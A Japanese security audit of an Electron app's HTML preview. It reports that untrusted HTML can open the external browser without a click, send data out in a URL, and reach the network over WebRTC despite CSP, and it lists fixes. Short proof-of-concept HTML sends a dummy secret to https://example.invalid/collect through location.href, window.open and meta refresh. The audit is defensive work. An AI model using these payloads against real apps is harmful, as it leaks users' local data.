# HTML プレビューと外部リンクのセキュリティ調査

2026-10-31 時点の調査記録。対象は `html-link` ワークツリーの未コミット変更を含む。

現在の実装には、HTML を見ただけで外部ブラウザを起動し、その URL に情報を含めて送れる問題がある。
別のワークツリーへ切り替えても、隠れた HTML から起動できることも再現した。
「クリックしたリンクをブラウザで開く」という要件より広い操作を許しているため、今回の実装は見直す必要がある。

今回の変更前からある問題として、通信を禁止する CSP があっても WebRTC の通信が通ることを確認した。
このため「HTML プレビューは外部通信できない」という説明は正確ではない。

本記録は調査結果と対応案であり、以下の問題はまだ修正していない。

## 調べた前提

- 悪意ある HTML、AI が生成した HTML、依存する JavaScript・CSS を信用しない。
- ユーザーがファイルを選んで表示することと、ブラウザを開くことへの同意を分ける。
- 守る対象はローカルファイル、プレビュー内への入力、Yuru のファイル操作・ターミナル機能、
  外部ブラウザのログイン状態、CPU・メモリ・ディスク・操作の継続性。
- 対象経路は通常リンク、新規ウィンドウ、JavaScript、自動転送、ローカルリソース、
  表示終了後の処理、IPC、OS への URL 引き渡し。
- 監査用 Electron は 43.8.1、Chromium は 150.0.7871.250、組み込み Node.js は 24.22.0。
- 実ブラウザの起動は記録用の処理に置き換えた。ファイルはダミー、HTTP・UDP サーバーは
  `127.0.0.1` のみ使用した。実際の秘密情報やユーザーのブラウザアカウントは使っていない。

## 再現できた問題

| 番号 | 起こること | 検証結果 | 由来 |
| --- | --- | --- | --- |
| 1 | HTML を開いただけで、読めた値を外部 URL に入れてブラウザに渡せる | ローカルの `config.js` に置いたダミー値を読み、クリックなしで `https://example.invalid/collect?value=...` を OS のブラウザ起動処理へ渡した | 今回追加された経路 |
| 2 | クリックなしで複数のタブを開ける | ページ読込直後の `window.open()` 3 回すべてがブラウザ起動処理に届いた | 今回追加された経路 |
| 3 | JavaScript を使わない自動転送でもブラウザが開く | `meta http-equiv="refresh"` だけでブラウザ起動処理に届いた | 今回追加された経路 |
| 4 | リンク以外をクリックしてもブラウザが開く | 「Show more」というボタンが `location.href` を変更し、ブラウザ起動処理に届いた | 今回追加された経路 |
| 5 | 別のワークツリーを見ている間にも、前の HTML がブラウザを開く | 元の iframe が非表示で、元 URL の新規リクエストが 404 になることを確認した後、HTML のタイマーがブラウザ起動処理を呼んだ | 既存の iframe 保持と今回の変更の組合せ |
| 6 | 「通信禁止」の設定があっても、別の方式で通信できる | `connect-src 'none'` のページから WebRTC の接続準備を開始し、検証用 UDP サーバーに STUN パケットが到達した | 以前からある制限の不足 |

1 は、任意のファイルを自由に読めた、という意味ではない。
確認したのは、読み込みが許可された通常の JavaScript ファイルの値を、そのまま外へ渡せること。
通常の `fetch` でテキストを読む経路と JSON モジュールの読み取りは遮断された。
ただし HTML 内の値、読み込めた JavaScript の値、ユーザーが HTML 内に入力した値などは、
同じ URL の経路で送れる対象になる。

OS へ渡した URL は、実ブラウザでは接続先へのリクエストや履歴などに残り得る。
今回の検証は OS への引き渡しまでで、実ブラウザや外部サイトでの受信確認は行っていない。

5 では、ファイルの読み取り許可を消しても、ロード済みの HTML やそのタイマーは停止しない。
外部リンクを扱う処理も、プレビュー用 URL の形式だけを確認し、その許可がまだ有効か、
現在表示されている HTML かを確認していない。

6 で確認したのはローカル UDP サーバーへの STUN 通信。
インターネット上の第三者への接続や、WebRTC DataChannel による秘密情報の転送までは試していない。
ただし「プレビューから通信が一切出ない」という前提は、この結果だけでも成立しない。
CSP の現行草案でも、WebRTC には独立した制限が定義されている。
`webrtc 'block'` を設定すれば現在の Electron で必ず止まる、とはこの監査では検証していない。
([CSP の WebRTC 制限](https://www.w3.org/TR/CSP3/#directive-webrtc))

### 再現の中心となる HTML

読み込み可能な JavaScript にダミー値を置いたケース:

```js
// private/config.js
window.auditSecret = "AUDIT_FAKE_PRIVATE_VALUE";
```

```html
<script src="./private/config.js"></script>
<script>
  location.href = "https://example.invalid/collect?value=" + window.auditSecret;
</script>
```

クリックなしの連続起動:

```html
<script>
  for (let i = 0; i < 3; i++) {
    window.open("https://example.invalid/burst-" + i);
  }
</script>
```

JavaScript を使わない自動転送:

```html
<meta http-equiv="refresh" content="0;url=https://example.invalid/refresh">
```

## 条件がある問題と、追加で考慮すべきこと

| 番号 | 懸念 | 根拠・成立条件・確認の限界 |
| --- | --- | --- |
| 7 | 読み取り範囲の確認後にファイルが差し替わると、範囲外を読める | `realpath` での確認と `readFile` が別々。確認後にファイルを外向きのシンボリックリンクへ差し替えると、範囲外のダミー内容が返ることを単体検証で再現した。同時にファイルを変更できる別処理が必要で、HTML 単体によるファイル書込みは実証していない |
| 8 | ページに必要な範囲より広いファイルが読み込み対象になる | 作業ツリー内の HTML は作業ツリー全体、外の HTML はその親フォルダが許可範囲になる。許可範囲内の JavaScript 等に秘密の値があれば 1 と組み合わさる。全形式のファイル内容を読めるわけではない |
| 9 | Chrome の内部 URL まで起動対象になる | プレビューも既存の外部リンク許可一覧を使い、`http:` / `https:` に加えて `chrome:` を許可する。`chrome:` は Chrome を指定して起動する実装。必要な Web リンクより権限が広い。実際に Chrome の内部ページを操作する検証はしていない |
| 10 | ユーザーがログイン中のサイトやローカル管理画面に、意図しないアクセスが発生する | OS のブラウザで開くと、そのブラウザのログイン状態でアクセスする。URL を開く GET リクエストだけで状態が変わるサイトなら影響がある。localhost・LAN 内のサービスも候補になる。サーバー側の実装次第であり、この監査では実サービスを操作していない |
| 11 | 見た目と違う行き先へ誘導できる | HTML はボタン、リンク文字列、透明なリンク、入力欄などを作れる。4 は実際に再現。実際のクリックを確認するだけでも「その行き先を開くつもりだった」ことまでは保証しない。ユーザー情報を含む URL を、ユーザー自身にクリックさせることも可能 |
| 12 | CPU・メモリ・ディスクを使い切って操作できなくする | JavaScript の計算量、DOM、画像展開、ローカルリソースの要求数にページ単位の制限がない。配信側もファイル全体をメモリに読み、サイズや同時読込み数を制限していない。破壊的な負荷試験はしていない |
| 13 | 別プレビューの URL を知った場合の読込み許可が広い | CSP は自分の origin だけでなく `yuru-preview:` 全体を許可し、応答も CORS と CORP を広く許可する。別の許可 ID を知れば、その ID に対して許されたリソースの読込みを試せる設定。ID はランダムなので、ID の推測や別プレビューへの侵入を実証したわけではない。通常の外部ブラウザから、この内部 protocol を直接読めることを意味しない |
| 14 | ストレージが表示終了後にも残る | `localStorage` は明示的に許可され、プレビューは Yuru と同じ default session を使う。許可 ID の削除時にブラウザの保存データは消していない。ID ごとに origin は異なるので、別プレビューから直ちに読めるとはいえないが、保存期間・容量・消去方針がない |
| 15 | 「過去の HTML」を表示していても、現在の JavaScript を実行する | 選択した HTML 本文は表示対象のスナップショットだが、相対参照される CSS・JavaScript は現在のディスクから読む。古い版を見ているつもりでも、変更済みの依存ファイルが実行される |
| 16 | ページが別のローカル HTML に移動しても、Yuru のヘッダは元ファイル名を示す | 内部へのページ移動は許可されるが、iframe の移動をプレビュー選択やヘッダへ反映する処理はない。表示元を取り違えさせる可能性がある。これは外部リンクを許可する前から存在する挙動 |
| 17 | IPC の送信元確認が全操作で統一されていない | HTML 用の許可作成・解放などはメインフレームを確認するが、共通の `handleIpc` は確認しない。ファイル・ターミナル系にも個別確認がない操作がある。現在は preload の公開制限と origin 隔離が防御になっており、HTML からこれらの IPC を直接呼ぶ突破は確認していない。前段の防御が破られた場合の影響が大きい |
| 18 | `allow-popups` は新規ウィンドウ以外の制限にも影響する | HTML 標準では、外部アプリへ渡すカスタム protocol の sandbox 制限も緩む。現在の許可一覧と権限要求の拒否は別の防御として必要。検証した独自 protocol・`file:`・`data:` は外部ブラウザ呼出しに流れなかった |
| 19 | URL の内容が意図しない場所に残る | クエリ等のデータは接続先、ブラウザ履歴、OS への引き渡しに含まれる。URL にユーザー情報を含めることや、極端に長い URL を除外する制限はない。起動失敗のエラーメッセージに URL が入れば、エラー画面やログにも含まれ得る。実際の OS エラーへの秘密情報混入は未検証 |
| 20 | ランタイムの脆弱性と、まだ検証していない通信方式 | HTML・JavaScript・画像・動画・フォント等の処理は Electron / Chromium に依存する。既知 CVE の全件照合、未知の脆弱性、OS sandbox 脱出は今回未検証。DNS 先読み、preconnect、他のブラウザ API、OS・バージョン差も含めて「通信の完全遮断」を保証できる状態にはない |

18 の仕様上の根拠は
[HTML 標準の sandbox フラグ](https://html.spec.whatwg.org/multipage/browsers.html#sandboxing)。
Electron も、信用できない URL の OS への引き渡しと、IPC の送信元確認を独立した注意点としている。
([外部 URL](https://www.electronjs.org/docs/latest/tutorial/security#15-do-not-use-shellopenexternal-with-untrusted-content),
[IPC 送信元](https://www.electronjs.org/docs/latest/tutorial/security#17-validate-the-sender-of-all-ipc-messages))

7 の単体検証では、`fs.promises.stat` を検証用に差し替え、その完了直後にダミーファイルを
外向きのシンボリックリンクへ置換した。次の `readFile` が範囲外のダミー値を返すことを確認した。
競合を決まったタイミングで発生させた検証であり、外部の攻撃者がその差替え権限やタイミングを
実際に獲得できることまで実証したものではない。

## 今回は遮断された経路

| 経路 | 確認方法・結果 |
| --- | --- |
| HTML から Yuru の画面を読む | `parent.document` は拒否された |
| HTML からファイル操作・ターミナル用 API を呼ぶ | `window.electronAPI` は `undefined`。直接の IPC 突破は確認していない |
| HTML 内で Node.js を使う | `require` は `undefined`。BrowserWindow は Node integration 無効、context isolation / sandbox 有効 |
| 通常の HTTP リソース取得 | 外部画像・JavaScript・CSS・iframe・fetch・beacon を試し、検証用 HTTP サーバーの受信は 0 件だった。WebRTC の例外は上記 6 |
| ローカルのテキストを fetch で読む | `connect-src 'none'` で拒否された |
| JSON モジュールとしてローカル JSON を読む | `connect-src 'none'` の違反が出て読み取れなかった |
| HTML から Yuru 本体を別ページに切り替える | `target="_top"` を拒否。アプリの URL は元のまま |
| 別の Electron ウィンドウを作る | 検証後も BrowserWindow は 1 個。新規ウィンドウ要求は拒否される |
| `file:`・`data:`・独自 protocol を外部ブラウザへ渡す | 検証したリンクは起動用スタブに流れなかった。`javascript:` は許可一覧外だが、HTML 自身の JavaScript 実行が禁止される意味ではない |
| HTML からのダウンロード | `download` 付きリンクを試し、ダウンロード開始は 0 件だった。外部ブラウザで開いた後のダウンロードは別の話 |
| 通常のパス逸脱・外向きシンボリックリンク | 既存単体テストで拒否を確認。途中の差替えは上記 7 |
| 許可を解放した後の新規読込み | 404 を確認。ただしロード済み HTML の停止にはならないことを上記 5 で確認 |

`navigator.sendBeacon()` は、この環境では CSP に遮断されても `true` を返した。
戻り値だけで送信成功とせず、受信側の 0 件と CSP 違反ログで判定した。

権限要求は main 側で一律拒否する実装。カメラ・マイク・通知・クリップボード等の API を
一つずつ実行して確認したわけではない。WebRTC の通信準備は、この拒否だけでは止まらなかった。

## 対応の順序

1. まず今回の追加経路を、ユーザーが実際に選んだ外部リンクの操作に限定する。
   自動転送、任意の JavaScript による移動、クリックなしの新規ウィンドウ要求を起動理由にしない。
   HTML 自身が送る「クリックした」という申告や、単に直前に何かをクリックした事実だけを信用しない。
2. 対象が現在表示中で、有効な読み取り許可を持つプレビューか確認し、1 回の操作で 1 回だけ開く。
   HTML の非表示・表示終了時には、ロード済みの処理も停止させる。
3. HTML プレビューで許可する URL は、その機能の要件から決める。
   他の機能の都合で許可している `chrome:` をそのまま共有しない。
   行き先のホストが分かる表示を用意し、プレビュー内のボタン等と外部リンクを取り違えにくくする。
4. クリックへの限定だけで、情報持ち出しを全て防げるとは考えない。
   HTML の JavaScript を許可する範囲、読めるローカルリソース、通信の制限を組み合わせて決める。
   WebRTC も含めて実際に遮断できる方法を検証する。
5. ローカルファイルの配信範囲・ファイル差替えへの対処、サイズ・回数の上限、
   プレビュー間の読み込み制限、保存データの寿命を見直す。
6. IPC の送信元確認を共通化し、プレビューでの問題がファイル操作やターミナル操作に
   直結しないようにする。ランタイムの修正状況も継続して確認する。

自動転送をブラウザへ渡さなくすることは今回の要件内の修正。
JavaScript を無効にする、読み込み対象を狭くする、保存データを破棄する等は、
HTML の操作性や相対リソースの読み込みに影響するため、仕様として決める必要がある。

## 検証記録と参照箇所

一時 E2E 9 件を同じ条件で実行してすべて成功。これは、安全性を示す 9 件という意味ではなく、
上記の問題が再現することを確認したテストと、防御が働くことを確認したテストの合計。
再試行でだけ成功したテストはなかった。既存の HTML 配信単体テストも 3 件成功。
競合による範囲外読込みは、別の Node.js 検証で確認した。

監査ログは `/private/tmp/yuru-html-link-security-audit.log`。
検証用 E2E は `/private/tmp/yuru-html-link-security-audit.test.ts` に保存。
再実行する場合は `test/e2e/` へ一時コピーして、リポジトリの E2E 実行規則に従う。
一時テストは通常のテストスイートから取り除き、製品のソースコードはこの監査では変更していない。

- `src/main/index.ts`: 外部 URL の処理、ナビゲーション、新規ウィンドウ、権限要求、IPC の共通処理。
- `src/main/preview/html-preview.ts`: CSP、読み取り許可、実パス確認、ファイル読込み、応答ヘッダ。
- `src/main/files/files.ts`: HTML が読み込めるフォルダの決定。
- `src/renderer/preview/HtmlPreview.tsx`: iframe の制約と読み取り許可の解放。
- `src/renderer/App.tsx`: 別のワークツリーを表示中も DOM を保持する処理。
- `src/preload/index.ts`: Yuru の API をメインフレームだけへ公開する処理。
- `src/main/service.ts` / `src/shared/external-url.ts`: URL の許可一覧と OS / Chrome の起動。
- `src/main/exec.ts`: OS コマンドは引数配列で起動し、シェル文字列として評価していない。

任意の OS コマンド実行、ユーザーの全ファイルの読み取り、実アカウントの乗っ取りを
実証した調査ではない。遮断できた経路と、条件付きの懸念をそれらの実証と取り違えない。
